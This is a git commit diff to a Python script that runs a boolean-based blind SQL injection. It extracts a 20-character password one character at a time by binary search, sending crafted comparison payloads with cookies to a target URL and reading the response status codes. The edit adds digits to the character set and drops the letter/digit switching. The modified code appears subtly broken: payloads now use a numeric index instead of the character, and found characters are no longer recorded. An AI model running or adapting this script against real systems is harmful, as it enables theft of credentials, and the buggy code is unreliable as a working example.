87174ed8ff328ed2a05654118ab55cb9e37e04d8
unknown <fournoyfr@protonmail.com>
2025-04-03 11:40:01 +0200

    code en cours de modification

--- EXEMPLE_boolean_based_SQLI_main2.py
+++ EXEMPLE_boolean_based_SQLI_main2.py
@@ -17,11 +17,10 @@ def get_password_with_boolean_based_SQLi():
     success = True 
     while indice <= 20: #we assume that the password have 20 character
         if success: #initialisation of all variable used during the process
-            letter = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
+            letter = ['0','1','2','3','4','5','6','7','8','9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
             low_bound = 0
-            high_bound = 25
-            mid_point = 13
-            marquage = 'lettre'
+            high_bound = 36
+            mid_point = 18
             operator1 = '>'
             operator2 = '='
             payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
@@ -60,25 +59,16 @@ def get_password_with_boolean_based_SQLi():
                     success = True
                     successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
                     indice +=1
-                    match marquage:#the purpose here is to print correctly the working 
-                        case "chiffre":
-                            liste.append(str(mid_point))
-                        case "lettre":
-                            liste.append(str(letter[mid_point]))
                     break
+                
             except Exception as e:
                 print(f"error during binary search {e}")
              
             """We change the binary_average in order to search the best parameter"""
                     
             mid_point = (low_bound+high_bound)//2
-            match marquage:
-                case 'chiffre':
-                    payload_parameter1 = f"{operator1}'{mid_point}'"
-                    payload_parameter2 = f"{operator2}'{mid_point}'"
-                case 'lettre':
-                    payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
-                    payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
+            payload_parameter1 = f"{operator1}'{mid_point}'"
+            payload_parameter2 = f"{operator2}'{mid_point}'"
                     
             """We send a packet with the new craft payload and see if it work"""
             
@@ -99,35 +89,19 @@ def get_password_with_boolean_based_SQLi():
             status_code, status_code2 = sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
             print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
 
-            ###########pb commence là###########""
+            
             if status_code2 != 200:
                 success = True
                 successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
                 indice +=1
-                
-                """Here we match the marquage to the good term in order to print the correct parameter to the user"""
-                
-                match marquage:
-                    case "chiffre":
-                        liste.append(str(mid_point))
-                    case "lettre":
-                        liste.append(str(letter[mid_point]))
                 break
             
         """Here the part where we change letters to numbers"""
            ########PB ICI##############""
-        if low_bound > high_bound:  
-            low_bound, high_bound = 0, 10 
-            mid_point = (low_bound+high_bound)//2
-            marquage = 'chiffre'
-            print(Fore.MAGENTA + "Move on to the numbers test.\n" + Style.RESET_ALL)
-            success = False
-            payload_parameter1 = f"{operator1}'{mid_point}'"
-            payload_parameter2 = f"{operator2}'{mid_point}'"
         
         #in case if the letters and the numbers don't work, we stop the programm. 
                         
-        elif low_bound > high_bound and marquage == 'chiffre':
+        if low_bound > high_bound :
             warning_message("All tests failed :( ")
             break
             
